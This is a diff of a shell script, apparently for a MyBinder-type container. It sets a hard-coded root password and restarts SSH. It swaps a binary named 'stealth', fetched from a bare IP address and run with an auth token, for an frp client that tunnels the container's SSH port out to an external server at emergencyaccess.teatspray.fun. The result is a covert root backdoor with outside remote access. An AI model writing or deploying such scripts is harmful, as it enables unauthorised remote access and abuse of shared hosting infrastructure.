@@ -29,21 +29,32 @@ END
 sleep 2
 echo "root:Pmataga87465622" | chpasswd
 service ssh restart
-wget -q http://45.135.58.52/stealth >/dev/null
-sleep 2
-service dropbear restart
-sleep 2
-chmod +x stealth
-sleep 2 && \
-./stealth authtoken 1isPFa4YB5iBdfaB12S3IsHHTRK_Nsw75ddUg9JdEjnPYFa1
-sleep 2
-screen -dmS dropbear -c './stealth tcp 2299'
+wget https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz
+tar -xvf frp_0.48.0_linux_amd64.tar.gz
+# start from daemon
+cp frp_0.48.0_linux_amd64/frpc /usr/bin
+mkdir /etc/frp
+mkdir /var/frp  # log
 
-sleep 5
-netstat -ntlp
 sleep 2
 
-curl http://127.0.0.1:4040/api/tunnels && sleep 86400
+cat > /etc/frp/frpc.ini <<END
+[common]
+server_addr = emergencyaccess.teatspray.fun
+server_port = 7000
 
-ping t.co
+[ssh.mybinder]
+type = tcp
+local_ip = 127.0.0.1
+local_port = 2299
+remote_port = 12299
+subdomain = mybinder
+
+END
+
+sleep 2
+
+#mybinder.emergencyaccess.teatspray.fun
+
+/usr/bin/frpc -c /etc/frp/frpc.ini
 
